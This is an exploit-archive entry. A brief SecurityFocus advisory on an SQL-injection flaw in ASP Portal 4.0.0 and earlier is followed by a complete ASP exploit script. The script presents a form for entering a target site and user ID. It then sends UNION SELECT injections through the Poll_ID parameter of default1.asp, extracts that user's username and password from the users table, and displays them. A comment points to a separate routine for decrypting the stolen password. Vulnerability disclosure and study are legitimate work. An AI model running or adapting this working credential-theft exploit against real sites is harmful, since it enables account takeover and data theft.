source: https://www.securityfocus.com/bid/21039/info

ASP Portal is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.

ASP Portal 4.0.0 and prior versions are vulnerable.

<% Response.Buffer = True %>
<% On Error Resume Next %>
<% Server.ScriptTimeout = 100 %>

<%

'===============================================================================================
'[Script Name: ASPPortal <= 4.0.0(default1.asp) Remote SQL Injection Exploit
'[Coded by   : ajann
'[Author   : ajann
'[Contact    : :(
'[ExploitName: exploit1.asp

'[Note : exploit file name =>exploit1.asp
'[Using : Write Target and ID after Submit Click
'[Using : Tr:Al?nan Sifreyi Perl scriptinde c?z?n.
'[Using : Tr:Scriptin Tr Dilinde bu exploitle bilgileri alamassiniz,manuel
cekebilirsiniz
'[Using : Tr:Kimsenin boyle yapicak kadar seviyesiz oldunu d?s?nm?yorum.
'===============================================================================================
'use sub decrypt() from http://www.milw0rm.com/exploits/1597 to decrypt /str0ke

%>

<html>
<title>ASPPortal <= 4.0.0 (default1.asp) Remote SQL Injection Exploit</title>
<head>

<script language="JavaScript">
   function functionControl1(){
         setTimeout("functionControl2()",2000);
      }

   function functionControl2(){
             if(document.form1.field1.value==""){

      alert("[Exploit Failed]=>The Username and Password Didnt Take,Try Again");

                              }
                         }

   function writetext() {

             if(document.form1.field1.value==""){
document.getElementById('htmlAlani').innerHTML='<font face=\"Verdana\"
size=\"1\" color=\"#008000\">There is a problem... The Data Didn\'t Take
</font>'

                             }
                  }
   function write(){
         setTimeout("writetext()",1000);
      }

</script>


</head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<body bgcolor="#000000" link="#008000" vlink="#008000" alink="#008000">

<center>
<font face="Verdana" size="2" color="#008000"><b><a
href="exploit1.asp">ASPPortal <=</b>v4.0.0(default1.asp) <u><b>
Remote SQL Injection Exploit</b></u></a></font><br><br>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse:
collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080"
bordercolordark="#008000" bordercolor="#808080">
   <tr>
     <td width="50%" bgcolor="#808000"
onmouseover="javascript:this.style.background='#808080';"
onmouseout="javascript:this.style.background='#808000';">
     <font face="Arial" size="1"><b><font
color="#FFFFFF">TARGET:</font>Example:[http://x.com/path]</b></font><p>
     <b><font face="Arial" size="1" color="#FFFFFF">USER ID:</font></b><font
face="Arial" size="1"><b>Example:[User
     ID=1]</b></font></td>
     <td width="50%"><center>
<form method="post" name="form1" action="exploit1.asp?islem=get">
<input type="text" name="text1" value="http://" size="25"
style="background-color: #808080"><br><input type="text" name="id" value="1"
size="25" style="background-color: #808080">
<input type="submit" value="Get"></center></td>
   </tr>

</table>

<div id=htmlAlani></div>

<%
islem = Request.QueryString("islem")
If islem = "hata1" Then
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a
problem! Please complete to the whole spaces</font>"
End If
If islem = "hata2" Then
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a
problem! Please right character use</font>"
End If
If islem = "hata3" Then
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a
problem! Add ""http://""</font>"
End If
%>

<%

If islem = "get" Then

string1="default1.asp"
string2="default1.asp"
cek= Request.Form("id")


targettext = Request.Form("text1")
arama=InStr(1, targettext, "union" ,1)
arama2=InStr(1, targettext, "http://" ,1)

If targettext="" Then
Response.Redirect("exploit1.asp?islem=hata1")

Else
If arama>0 then
Response.Redirect("exploit1.asp?islem=hata2")

Else
If arama2=0 then
Response.Redirect("exploit1.asp?islem=hata3")

Else
%>

<%

target1 = targettext+string1
target2 = targettext+string2

Public Function take(come)
Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
With objtake
   .Open "POST" , come, FALSE
   .setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
   .send
"Voteit=1&Poll_ID=-1%20union%20select%200,username,0,0,0,0,0,0,0%20from%20users%20where%20user_id%20like%20"+cek
take =  .Responsetext
End With
SET objtake = Nothing
End Function

Public Function take1(come1)
Set objtake1 = Server.CreateObject("Microsoft.XMLHTTP" )
With objtake1
   .Open "POST" , come1, FALSE
   .setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
   .send
"Voteit=1&Poll_ID=-1%20union%20select%200,password,0,0,0,0,0,0,0%20from%20users%20where%20user_id%20like%20"+cek
take1 =  .Responsetext
End With
SET objtake1 = Nothing
End Function

get_username = take(target1)
get_password = take1(target2)

getdata=InStr(get_username,"Poll Question:</b> " )
username=Mid(get_username,getdata+24,14)
passwd=Mid(get_password,getdata+24,14)

%>
<center>
<font face="Verdana" size="2" color="#008000"> <u><b>
ajann<br></b></u></font>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse:
collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080"
bordercolordark="#008000" bordercolor="#808080">
   <tr>
     <td width="50%" bgcolor="#808000"
onmouseover="javascript:this.style.background='#808080';"
onmouseout="javascript:this.style.background='#808000';">
     <b><font size="2" face="Arial">User Name:</font></b></td>
     <td width="50%"> <b><font color="#C0C0C0" size="2"
face="Verdana"><%=username%></font></b></td>
   </tr>
   <tr>
     <td width="50%" bgcolor="#808000"
onmouseover="javascript:this.style.background='#808080';"
onmouseout="javascript:this.style.background='#808000';">
     <b><font size="2" face="Arial"> User Password:</font></b></td>
     <td width="50%"> <b><font color="#C0C0C0" size="2"
face="Verdana"><%=passwd%></font></b></td>
   </tr>

</table>

<form method="POST" name="form2" action="#">
<input type="hidden" name="field1" size="20" value="<%=passwd%>"></p>
</form>

</center>

<script language="JavaScript">
write()
functionControl1()
</script>

</body>
</html>

<%
End If
End If
End If
End If
Set objtake = Nothing
%>